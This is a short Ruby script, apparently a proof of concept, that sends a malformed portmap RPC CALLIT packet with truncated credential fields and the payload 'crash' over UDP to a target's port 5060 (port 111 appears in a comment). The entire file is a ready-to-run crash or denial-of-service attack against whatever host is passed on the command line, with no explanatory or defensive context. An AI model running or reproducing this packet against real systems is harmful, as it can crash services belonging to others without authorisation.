#!/usr/bin/ruby

require 'socket'

def usage
    abort "\nusage: ./udp2.rb <target>\n"
end

if ARGV.length == 1
    pkt = [rand(2**32)].pack('N')   # XID
    pkt << [0].pack('N')          # Message Type: CALL (0)
    pkt << [2].pack('N')          # RPC Version: 2
    pkt << [100000].pack('N')     # Program: Portmap (100000)
    pkt << [2].pack('N')          # Program Version: 2
    pkt << [5].pack('N')          # Procedure: CALLIT (5)
    pkt << [0].pack('N')          # Credentials Flavor: AUTH_NULL (0)
    #pkt << [0].pack('N')          # Length: 0
    #pkt << [0].pack('N')          # Credentials Verifier: AUTH_NULL (0)
    #pkt << [0].pack('N')          # Length: 0
    #pkt << [0].pack('N')          # Program: Unknown (0) 
    #pkt << [1].pack('N')          # Version: 1
    #pkt << [1].pack('N')          # Procedure: 1
    #pkt << [8945].pack('N')           # Argument Length
    pkt << "crash"                    # Arguments
 
    s = UDPSocket.new
    s.send(pkt, 0, ARGV[0], 5060) #111)
else
    usage
end
